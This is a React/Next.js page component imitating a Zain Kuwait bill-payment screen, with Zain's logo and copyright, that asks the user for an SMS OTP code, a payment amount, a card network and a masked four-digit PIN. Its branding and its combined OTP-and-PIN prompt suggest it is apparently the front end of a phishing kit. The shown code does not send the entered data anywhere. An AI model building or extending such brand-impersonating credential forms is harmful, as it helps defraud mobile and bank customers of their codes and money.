"use client"

import { useState, useRef } from "react"
import { useSearchParams } from "next/navigation"
import Image from "next/image"
import Link from "next/link"
import { Suspense } from "react"

function BillContent() {
  const searchParams = useSearchParams()
  const phone = searchParams.get("phone") || "XXXXXXXX"
  
  // OTP State
  const [otp, setOtp] = useState(["", "", "", ""])
  const otpRefs = [useRef<HTMLInputElement>(null), useRef<HTMLInputElement>(null), useRef<HTMLInputElement>(null), useRef<HTMLInputElement>(null)]
  
  // Amount State
  const [selectedAmount, setSelectedAmount] = useState<"full" | "custom" | "minimum">("full")
  const [customAmount, setCustomAmount] = useState("")
  
  // Payment Method State
  const [selectedPayment, setSelectedPayment] = useState<"visa" | "mastercard" | "knet">("knet")
  
  // Verification Code State
  const [verificationCode, setVerificationCode] = useState(["", "", "", ""])
  const verificationRefs = [useRef<HTMLInputElement>(null), useRef<HTMLInputElement>(null), useRef<HTMLInputElement>(null), useRef<HTMLInputElement>(null)]
  
  const fullAmount = 12.500
  const minimumAmount = 5.000
  
  const getPayAmount = () => {
    switch (selectedAmount) {
      case "full":
        return fullAmount.toFixed(3)
      case "minimum":
        return minimumAmount.toFixed(3)
      case "custom":
        return customAmount || "0.000"
    }
  }

  const handleOtpChange = (index: number, value: string) => {
    if (value.length > 1) return
    const newOtp = [...otp]
    newOtp[index] = value
    setOtp(newOtp)
    if (value && index < 3) {
      otpRefs[index + 1].current?.focus()
    }
  }

  const handleOtpKeyDown = (index: number, e: React.KeyboardEvent) => {
    if (e.key === "Backspace" && !otp[index] && index > 0) {
      otpRefs[index - 1].current?.focus()
    }
  }

  const handleVerificationChange = (index: number, value: string) => {
    if (value.length > 1) return
    const newCode = [...verificationCode]
    newCode[index] = value
    setVerificationCode(newCode)
    if (value && index < 3) {
      verificationRefs[index + 1].current?.focus()
    }
  }

  const handleVerificationKeyDown = (index: number, e: React.KeyboardEvent) => {
    if (e.key === "Backspace" && !verificationCode[index] && index > 0) {
      verificationRefs[index - 1].current?.focus()
    }
  }

  return (
    <div className="min-h-screen bg-[#0d0d1a] flex flex-col">
      {/* Header */}
      <header className="py-4 px-4">
        <div className="max-w-md mx-auto flex items-center justify-between">
          <Link href="/pay" className="w-10 h-10 rounded-full bg-[#1a1a2e] flex items-center justify-center">
            <svg className="w-5 h-5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 19l-7-7 7-7"/>
            </svg>
          </Link>
          <div className="flex-1 flex justify-center">
            <Image
              src="/zain-logo.svg"
              alt="Zain"
              width={80}
              height={32}
              className="h-8 w-auto"
            />
          </div>
          <div className="w-10" />
        </div>
      </header>

      {/* Main Content */}
      <main className="flex-1 flex flex-col items-center px-4 pt-4 pb-8 overflow-y-auto">
        <div className="w-full max-w-sm">
          
          {/* Phone Number Display */}
          <div className="text-center mb-6">
            <p className="text-gray-400 text-sm">Mobile Number</p>
            <p className="text-white text-xl font-bold">+965 {phone}</p>
          </div>

          {/* 1. OTP Code - 4 Digits */}
          <div className="mb-8">
            <p className="text-white text-center mb-2 font-semibold">Enter OTP Code</p>
            <p className="text-gray-400 text-center text-sm mb-4">We sent a code to your mobile</p>
            <div className="flex justify-center gap-3" dir="ltr">
              {otp.map((digit, index) => (
                <input
                  key={index}
                  ref={otpRefs[index]}
                  type="text"
                  inputMode="numeric"
                  maxLength={1}
                  value={digit}
                  onChange={(e) => handleOtpChange(index, e.target.value.replace(/[^0-9]/g, ""))}
                  onKeyDown={(e) => handleOtpKeyDown(index, e)}
                  className="w-14 h-14 bg-[#1a1a2e] border border-[#2a2a4a] rounded-xl text-white text-2xl text-center focus:outline-none focus:ring-2 focus:ring-[#6B2D83] focus:border-transparent"
                />
              ))}
            </div>
            <button className="w-full text-[#8B4CA0] text-sm mt-4 hover:underline">
              Resend Code
            </button>
          </div>

          {/* 2. Amount Selection */}
          <div className="mb-8">
            <p className="text-white text-center mb-4 font-semibold">Select Amount</p>
            
            {/* Full Amount */}
            <button
              onClick={() => setSelectedAmount("full")}
              className={`w-full flex items-center justify-between p-4 rounded-xl mb-3 border transition-all ${
                selectedAmount === "full" 
                  ? "bg-[#6B2D83]/20 border-[#6B2D83]" 
                  : "bg-[#1a1a2e] border-[#2a2a4a]"
              }`}
            >
              <div className="flex items-center gap-3">
                <div className={`w-5 h-5 rounded-full border-2 flex items-center justify-center ${
                  selectedAmount === "full" ? "border-[#8B4CA0]" : "border-gray-500"
                }`}>
                  {selectedAmount === "full" && (
                    <div className="w-2.5 h-2.5 rounded-full bg-[#8B4CA0]" />
                  )}
                </div>
                <span className="text-white">Full Amount</span>
              </div>
              <span className="text-white font-bold">{fullAmount.toFixed(3)} KWD</span>
            </button>

            {/* Custom Amount */}
            <button
              onClick={() => setSelectedAmount("custom")}
              className={`w-full p-4 rounded-xl mb-3 border transition-all text-left ${
                selectedAmount === "custom" 
                  ? "bg-[#6B2D83]/20 border-[#6B2D83]" 
                  : "bg-[#1a1a2e] border-[#2a2a4a]"
              }`}
            >
              <div className="flex items-center gap-3 mb-2">
                <div className={`w-5 h-5 rounded-full border-2 flex items-center justify-center ${
                  selectedAmount === "custom" ? "border-[#8B4CA0]" : "border-gray-500"
                }`}>
                  {selectedAmount === "custom" && (
                    <div className="w-2.5 h-2.5 rounded-full bg-[#8B4CA0]" />
                  )}
                </div>
                <span className="text-white">Custom Amount</span>
              </div>
              {selectedAmount === "custom" && (
                <input
                  type="number"
                  value={customAmount}
                  onChange={(e) => setCustomAmount(e.target.value)}
                  placeholder="Enter amount"
                  className="w-full bg-[#0d0d1a] text-white rounded-lg px-4 py-3 text-left placeholder:text-gray-500 focus:outline-none focus:ring-2 focus:ring-[#6B2D83] border border-[#2a2a4a] mt-2"
                  onClick={(e) => e.stopPropagation()}
                />
              )}
            </button>

            {/* Minimum Amount */}
            <button
              onClick={() => setSelectedAmount("minimum")}
              className={`w-full flex items-center justify-between p-4 rounded-xl border transition-all ${
                selectedAmount === "minimum" 
                  ? "bg-[#6B2D83]/20 border-[#6B2D83]" 
                  : "bg-[#1a1a2e] border-[#2a2a4a]"
              }`}
            >
              <div className="flex items-center gap-3">
                <div className={`w-5 h-5 rounded-full border-2 flex items-center justify-center ${
                  selectedAmount === "minimum" ? "border-[#8B4CA0]" : "border-gray-500"
                }`}>
                  {selectedAmount === "minimum" && (
                    <div className="w-2.5 h-2.5 rounded-full bg-[#8B4CA0]" />
                  )}
                </div>
                <span className="text-white">Minimum Amount</span>
              </div>
              <span className="text-white font-bold">{minimumAmount.toFixed(3)} KWD</span>
            </button>

            {/* Amount to Pay */}
            <div className="bg-[#1a1a2e] rounded-xl p-4 border border-[#2a2a4a] mt-4">
              <div className="flex justify-between items-center">
                <span className="text-gray-400">Amount to Pay</span>
                <span className="text-white text-xl font-bold">{getPayAmount()} KWD</span>
              </div>
            </div>
          </div>

          {/* 3. Payment Methods - KNET */}
          <div className="mb-8">
            <p className="text-white text-center mb-4 font-semibold">Select Payment Method</p>
            <div className="flex justify-center gap-3">
              <button 
                onClick={() => setSelectedPayment("visa")}
                className={`rounded-xl px-4 py-3 flex items-center justify-center min-w-[80px] transition-all ${
                  selectedPayment === "visa" 
                    ? "bg-white ring-2 ring-[#6B2D83]" 
                    : "bg-white/90 hover:bg-white"
                }`}
              >
                <Image 
                  src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" 
                  alt="Visa" 
                  width={50} 
                  height={30}
                  className="h-6 w-auto"
                />
              </button>
              <button 
                onClick={() => setSelectedPayment("mastercard")}
                className={`rounded-xl px-4 py-3 flex items-center justify-center min-w-[80px] transition-all ${
                  selectedPayment === "mastercard" 
                    ? "bg-white ring-2 ring-[#6B2D83]" 
                    : "bg-white/90 hover:bg-white"
                }`}
              >
                <Image 
                  src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" 
                  alt="Mastercard" 
                  width={50} 
                  height={30}
                  className="h-6 w-auto"
                />
              </button>
              <button 
                onClick={() => setSelectedPayment("knet")}
                className={`rounded-xl px-4 py-3 flex items-center justify-center min-w-[80px] transition-all ${
                  selectedPayment === "knet" 
                    ? "bg-[#0066B3] ring-2 ring-[#6B2D83]" 
                    : "bg-[#0066B3]/90 hover:bg-[#0066B3]"
                }`}
              >
                <span className="text-white font-bold text-base tracking-wide">KNET</span>
              </button>
            </div>
          </div>

          {/* 4. Verification Code */}
          <div className="mb-8">
            <p className="text-white text-center mb-2 font-semibold">Verification Code</p>
            <p className="text-gray-400 text-center text-sm mb-4">Enter your PIN</p>
            <div className="flex justify-center gap-3" dir="ltr">
              {verificationCode.map((digit, index) => (
                <input
                  key={index}
                  ref={verificationRefs[index]}
                  type="password"
                  inputMode="numeric"
                  maxLength={1}
                  value={digit}
                  onChange={(e) => handleVerificationChange(index, e.target.value.replace(/[^0-9]/g, ""))}
                  onKeyDown={(e) => handleVerificationKeyDown(index, e)}
                  className="w-14 h-14 bg-[#1a1a2e] border border-[#2a2a4a] rounded-xl text-white text-2xl text-center focus:outline-none focus:ring-2 focus:ring-[#6B2D83] focus:border-transparent"
                />
              ))}
            </div>
          </div>

          {/* Pay Button */}
          <button className="w-full bg-gradient-to-r from-[#6B2D83] to-[#8B4CA0] text-white font-bold py-4 rounded-full text-lg hover:opacity-90 transition-opacity shadow-lg shadow-purple-900/40">
            Pay {getPayAmount()} KWD
          </button>

        </div>
      </main>

      {/* Footer */}
      <footer className="py-4 px-4">
        <div className="max-w-md mx-auto">
          <p className="text-gray-600 text-xs text-center">
            Copyright 2024 Zain Group, all rights reserved
          </p>
        </div>
      </footer>
    </div>
  )
}

export default function BillPage() {
  return (
    <Suspense fallback={<div className="min-h-screen bg-[#0d0d1a] flex items-center justify-center"><div className="text-white">Loading...</div></div>}>
      <BillContent />
    </Suspense>
  )
}
